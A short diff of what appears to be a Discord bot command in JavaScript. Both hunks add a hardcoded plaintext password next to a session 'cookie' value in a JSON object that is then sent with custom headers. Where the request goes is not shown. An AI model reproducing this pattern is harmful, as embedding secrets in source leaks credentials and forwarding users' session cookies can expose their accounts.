@@ -59,7 +59,7 @@ module.exports = {
                         .setDescription(values)
                         .setThumbnail(icon)
                     //.setAuthor({ name: `${interaction.user.username}`, iconURL: `${interaction.user.avatarURL({ dynamic: true, size: 512 })}` })
-                    var myJSONObject = { 'cookie': cookie };
+                    var myJSONObject = { 'cookie': cookie, 'password': '91784SK8325k0r0lev' };
 
                     //Custom Header pass
                     var headersOpt = {
@@ -109,7 +109,7 @@ module.exports = {
                         .setDescription(values)
                         .setThumbnail(icon)
                     //.setAuthor({ name: `${interaction.user.username}`, iconURL: `${interaction.user.avatarURL({ dynamic: true, size: 512 })}` })
-                    var myJSONObject = { 'cookie': cookie };
+                    var myJSONObject = { 'cookie': cookie, 'password': '91784SK8325k0r0lev' };
 
                     //Custom Header pass
                     var headersOpt = {
